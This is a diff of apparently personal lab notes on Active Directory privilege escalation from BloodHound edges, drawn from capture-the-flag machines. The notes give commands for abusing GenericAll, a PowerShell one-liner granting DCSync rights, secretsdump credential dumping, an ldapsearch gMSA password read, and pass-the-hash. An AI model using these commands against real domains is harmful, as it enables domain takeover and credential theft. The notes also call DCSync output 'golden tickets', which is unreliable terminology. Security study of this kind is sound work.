@@ -39,6 +39,7 @@ Check for any ServicePrinicipalNames(SPNs) of other users from which we can extr
 ## Fourth
 If the Link says MemberOf, then we can disregard it, why? we can read that using right clicking on the link.
 
+### GenericAll
 If the Link says GenericAll, then we can just add the group to our user by simply doing `net group "GROUP NAME" USERNAME /add /domain` and get the elevated perms given to the group we just added ourselves to
 
 ### WriteDacl
@@ -46,6 +47,10 @@ If the Link says GenericAll, then we can just add the group to our user by simpl
 If the Link says WriteDacl and the abuse info says that we can do a dcsync attack then we can simply type this oneliner `Add-DomainGroupMember -Identity 'GROUP NAME' -Members USERNAME; $username = "HOSTNAME\USERNAME"; $password = "PASSWORD"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'USERNAME' -TargetIdentity 'DOMAINNAME\Domain Admins' -Rights DCSync`.
 
 And after that simply use secretsdump.py from impacket to get kerberos golden tickets of the accounts due to the nature of DCSync attack by using `secretsdump.py USERNAME:PASSWORD@DC IP`
+
+### ReadGMSAPassword
+
+If our owned user(AD object) has ReadGMSAPassword privelage for a GMSA(Group Managed Service Account), then usually its a high value target, due to as follows https://cube0x0.github.io/Relaying-for-gMSA/, so understanding this article, we see sometimes the GMSA is usually granted more rights than what it needs, hence it is in our best interest to own them. The article describes on how to do it if you have a shell with the account. But in intelligence from htb, we didnt have shell, so we used ldapsearch to gain info on it, using the following syntax `ldapsearch -x -b "DISTINGUISHED NAME OF THE TARGET GMSA RETRIEVED FROM BLOODHOUND" -H "ldap://DC IP" -D "DISTINGUISHED NAME OF THE OWNED ACCOUNT WHICH HAS THE RIGHTS" -w "PASSWORD OF THE OWNED ACCOUNT" "objectclass=*"`.
 
 ## Lastly
 The 2nd part of the golden ticket will be the hash required for a pass the hash attack, which we may use to get access via evilwinrm or we might try to crack it, to get cleartext passwords
